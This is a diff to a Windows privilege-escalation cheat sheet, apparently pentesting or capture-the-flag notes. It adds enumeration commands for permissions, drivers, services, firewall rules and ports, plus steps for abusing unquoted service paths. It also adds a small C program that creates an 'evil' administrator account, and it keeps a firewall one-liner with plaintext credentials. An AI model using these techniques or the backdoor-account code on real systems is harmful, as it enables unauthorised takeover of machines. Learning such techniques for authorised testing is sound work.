@@ -150,6 +150,30 @@ Dump groups:
 windows-privesc-check2.exe --dump -G
 ```
 
+## Administrator Executables
+
+### C Executables
+
+Add a new user to the Administrators group:
+
+```c
+#include <stdlib.h>
+
+int main ()
+{
+    int var;
+    var = system ("net user evil password /add");
+    var = system ("net localgroup administrators evil /add");
+    return 0;
+}
+```
+
+Compile the code with:
+
+```text
+sudo i686-w64-mingw32-gcc filename.c -o filename.exe
+```
+
 ## System Information
 
 ### Version information enumeration
@@ -283,9 +307,66 @@ wmic logicaldisk get caption,description,providername
 Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
 ```
 
-## Kernel Exploits
+## Un/Mounted File Systems
 
-soon!
+We can enumerate unmounted file systems/volumes with:
+
+```text
+mountvol
+mountvol [drive:]path VolumeName
+```
+
+## Files/Directories Permissions
+
+We can recursively enumerate files or directories permissions with:
+
+```text
+Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
+```
+
+* Get-ACL = retrieve all permissions for a given file or directory
+* Get-ChildItem = enumerate everything under the specified argument
+* -Recurse = recursive search
+* AccessToString -match = properties specified
+
+ Alternatively, we can use `accesschk.exe` from SysternalsSuite:
+
+```text
+accesschk.exe -uws "Everyone" "C:\Program Files"
+```
+
+* -u = supress errors
+* -w = write access permissions
+* -s = recursive search
+
+ 
+
+## Drivers and Kernel Vulnerabilities
+
+Enumerate the operating system with:
+
+```text
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
+```
+
+Enumerate drivers with `driverquery`:
+
+```text
+driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path
+```
+
+* /v = verbose
+* /fo = file output format
+
+Enumerate drivers with `WmiObject`:
+
+```text
+Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
+```
+
+* Win32\_PnPSignedDriver = provide digital signature information about the driver
+
+ 
 
 ## High Integrity to System
 
@@ -297,6 +378,93 @@ If you are already running on a High Integrity process, the escalation to SYSTEM
 sc create newservicename binPath= "C:\windows\system32\notepad.exe"
 sc start newservicename
 ```
+
+## Service Vulnerabilities
+
+### Prerequisites
+
+Before considering that we can take some service to escalate our privileges, we must answer the questions below first: 
+
+* **Can we stop the service?**
+
+```text
+net stop <service_name>
+```
+
+* **Can we start the service?**
+
+```text
+wmic service where caption="service_name" get name, caption, state, startmode
+```
+
+* **Does the service requires a reboot, if so can we reboot the machine?**
+
+```text
+whoami /priv
+```
+
+* **Reboot a machine**
+
+```text
+shutdown /r /t 0
+```
+
+* /r = reboot
+* /t = time in seconds
+
+### Enumerating Services
+
+#### tasklist
+
+We can use tasklist to enumerate running tasks:
+
+```text
+tasklist /SVC
+```
+
+> Note: It does not list processes run by privileged users, it needs higher privileges to do it.
+
+#### PowerShell WmiObject
+
+We can enumerate running services with:
+
+```text
+Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
+```
+
+#### icacls
+
+We can also use `icacls` to enumerate permissions:
+
+```text
+icacls "filename.exe"
+```
+
+Do BUILTIN\Users have F, M or R or W?
+
+* F = Full Access
+* M = Modify Access
+* RX = Read and execute access
+* R = Read-only access
+* W = Write-only access
+
+### Unquoted Service Path
+
+
+
+**Valid executable path Discovery:**
+
+```text
+wmic service get displayname, pathname
+```
+
+**Move the malicious executable:**
+
+```text
+move filename.exe "c:\program files\service\filename.exe"
+```
+
+**Restart the service or the machine.**
 
 ## Registry
 
@@ -670,6 +838,18 @@ The following command list all the scheduled jobs that your user can see:
 ```text
 schtasks /query /fo LIST /v
 
+/query = display tasks
+/fo LIST = simple list output format
+/v = verbose output
+
+# Intersting Output
+Next Run Time:
+Last Run Time:
+Task To Run:
+Schedule Type:
+Start Time:
+Start Date:
+
 #PowerShell
 Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
 ```
@@ -735,6 +915,13 @@ C:\Users\Administrator\Desktop>type root.txt
 
 ### Installed Apps
 
+We can enumerate installed applications with wmic:
+
+```text
+wmic product get name, version, vendor
+wmic qfe get Caption, Description, HotFixID, InstalledOn
+```
+
 ## Hot Potato
 
 ## Juicy Potato
@@ -775,17 +962,59 @@ This usually happens when the CLSID is not correct. As we know with the system t
 
 ### Port Forwarding
 
-### Shares
+Enumerate routing tables:
+
+```text
+route print
+```
+
+Enumerate listening ports:
+
+```text
+netstat -ano
+```
+
+Flags Explained:
+
+* a = display all active TCP connections
+* n = display address and port in numerical form
+* o = display the owner PID of each connection
+
+###  Shares
 
 ### Firewall Rules
 
-PowerShell One-Liner for allowing an inbound port:
+Enumerate the firewall of our current profile with:
+
+```text
+netsh advfirewall show currentprofile
+```
+
+* State = On/Off?
+
+Enumerate all the firewall rules:
+
+```text
+netsh advfirewall firewall show rule name=all
+```
+
+* Enable = Yes/No?
+* Direction = In/Out?
+* Grouping = ?
+* LocalP = Any/Specific?
+* RemoteIP = Any/Specific?
+* Protocol = Any/Secific?
+* Action = Allow/Deny?
+
+ PowerShell One-Liner for allowing an inbound port:
 
 ```text
 $user = 'minion\administrator'; $pw = '1234test'; $secpw = ConvertTo-SecureString $pw - AsPlainText -Force; $cred = New-Object \
 System.Management.Automation.PSCredential $user, $secpw; Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock \
 {New-NetFirewallRule -DisplayName setenso -RemoteAddress 10.10.14.8 -Direction inbound -Action Allow}
 ```
+
+We can enum
 
 ## Users & Groups 
 
